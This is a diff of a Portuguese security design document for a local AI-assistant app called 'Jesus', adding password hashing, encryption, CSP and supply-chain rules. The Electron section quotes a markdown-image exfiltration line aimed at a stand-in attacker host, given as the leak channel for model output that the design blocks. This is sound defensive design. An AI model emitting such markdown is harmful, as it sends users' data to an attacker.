@@ -435,6 +435,8 @@ O Jesus **nunca** faz o que está abaixo, mesmo que você peça, mesmo com todos
   - strings de conexão.
   - Se encontrar um segredo num parâmetro de ação com destino externo → **bloqueio**.
 - **Sua senha:** o Jesus nunca pede, guarda ou digita. O login é sempre você, na página oficial (OAuth).
+- **A senha do próprio Jesus** (para abrir o app, seção 3.20) é outra coisa: fica só como hash bcrypt e nunca é usada com nenhum provedor.
+- **Hash não é cifra.** O bcrypt serve para conferir senhas; o que precisa ser lido de volta (campos sensíveis, backups) é cifrado com AES-256-GCM, com a chave protegida pelo cofre ([decisão 0015](decisoes/0015-senha-local-com-bcrypt-e-dados-cifrados.md)).
 - **`.env`:** pode ser liberado por projeto, mas o Executor injeta os valores nos processos da sandbox que precisarem. **O modelo vê só os nomes** das variáveis.
 - **Rotação e revogação:** o botão "desconectar" revoga o token na API do provedor e apaga do cofre. Num incidente, "revogar tudo" com um clique (seção 3.18).
 
@@ -558,6 +560,7 @@ Seguir a lista oficial de segurança do Electron ([Electron Security](https://el
 - Validar a origem de toda mensagem IPC.
 - Markdown vindo do modelo é renderizado com sanitização e **sem carregar imagens remotas** sozinho. Esse é um canal clássico de vazamento: `![x](https://atacante/?dados=…)`.
 - Protocolo próprio (`app://`) em vez de `file://`.
+- **Interface em Next.js ([decisão 0013](decisoes/0013-interface-em-nextjs-dentro-do-electron.md)):** exportação estática, sem servidor do Next rodando no PC (nada de rota de API, *server action* ou porta local aberta). O App Router gera scripts inline; em vez de liberar `unsafe-inline`, o build grava em cada página a CSP com o SHA-256 de cada script (`script-src 'self' 'sha256-…'`), e o Zod roda sem JIT para não tentar `new Function`. O teste da exportação no Chromium não acusou nenhuma violação. A telemetria do Next fica desligada e o servidor de desenvolvimento só escuta em `127.0.0.1`.
 - Cartões de confirmação num componente separado, que o conteúdo do modelo não consegue imitar.
 
 ## 3.13 Autoproteção
@@ -576,6 +579,8 @@ Seguir a lista oficial de segurança do Electron ([Electron Security](https://el
 - Pacotes internos (`@jesus/*`) vêm só do workspace: o escopo aponta para um registry inexistente no `.npmrc`, contra confusão de dependências (o escopo `@jesus` no npm público não é nosso).
 - O npm não acusa import de pacote não declarado (dependência "fantasma"), como o pnpm acusava: a revisão confere que cada pacote declara o que importa.
 - Modelos baixados (voz, embeddings, LLM local): só de fontes oficiais, conferindo o hash.
+- **Prisma ([decisão 0014](decisoes/0014-prisma-como-orm.md)):** a CLI baixa sozinha um binário nativo (o *schema engine*) de `binaries.prisma.sh`, por fora do lockfile. O projeto evita isso no `prisma generate` (que não precisa dele) e no CI; só o `prisma migrate dev`, na máquina de quem desenvolve, usa o binário. O app instalado não leva a CLI: aplica as migrações em SQL com o migrador próprio. Os scripts de instalação do `prisma` e do `@prisma/engines` estão recusados em `allowScripts`.
+- **Next.js:** traz como dependência opcional o `sharp` (binários de imagem já compilados, sem script de instalação). O Jesus não usa otimização de imagem (`images.unoptimized`), então esses binários ficam instalados e parados.
 - Servidores MCP: versão fixada e hash das definições (seção 3.8).
 - Build reproduzível no GitHub Actions; instalador assinado quando for distribuir.
 
@@ -628,3 +633,16 @@ Na interface, aparece como uma linha do tempo, que pode ser exportada.
 - No modo padrão (sem AppContainer nem WSL2), a contenção é parcial: um comando malicioso que passe pelo Porteiro ainda pode ler arquivos fora das pastas negadas.
 - As confirmações dependem de você ler o cartão.
 - Modelos diferentes se comportam de jeitos diferentes, então a coleção de ataques precisa rodar para cada um.
+
+## 3.20 Senha local do Jesus
+
+Pedido do dono ([decisão 0015](decisoes/0015-senha-local-com-bcrypt-e-dados-cifrados.md)): o Jesus pede uma senha própria para abrir.
+
+- **Quando pede:** ao abrir, depois de 15 min sem uso (ajustável de 1 a 120 min), quando o Windows bloqueia a sessão e quando o PC suspende.
+- **Como guarda:** só o hash bcrypt (custo 12), na tabela `app_credentials`, que só o processo principal lê e grava (papel `jesus_config`; o Cérebro e o Executor não têm acesso). O banco recusa qualquer valor que não seja um hash bcrypt.
+- **Regras:** no mínimo 12 caracteres (15 ou mais recomendados); no máximo 72 bytes, o limite do bcrypt, recusando em vez de cortar (e recusando também, na conferência, a senha certa seguida de qualquer coisa); normalização NFC; recusa de senhas comuns, repetições e sequências; sem regra de composição.
+- **Tentativas erradas:** 5 livres; depois, espera que dobra a cada erro (30 s, 1 min, 2 min… até 15 min). A contagem fica no banco e é atômica. Nunca há bloqueio permanente. A mesma espera vale para o código de recuperação.
+- **Código de recuperação:** 100 bits aleatórios, mostrado uma vez na criação, guardado só como hash bcrypt; usado, é trocado por um novo.
+- **Com o Jesus bloqueado:** a interface mostra só a tela de entrada; pedidos novos não entram; cartões de confirmação e fluxos de conexão de contas são cancelados (o código do device flow sai da tela); "Jesus, pare" continua funcionando.
+- **Quem decide:** o processo principal (máquina de estados em `@jesus/auth`). A interface só manda a senha pela ponte de IPC e recebe o resultado; nunca vê o hash e não consegue se desbloquear sozinha.
+- **Limite honesto:** a senha protege o app de quem chega ao PC desbloqueado, mas não cifra os dados: um programa rodando como você ainda consegue pedir ao DPAPI a chave de dados (3.5). Derivar a chave também da senha fica como pergunta em aberto para o dono, depois das rotinas.
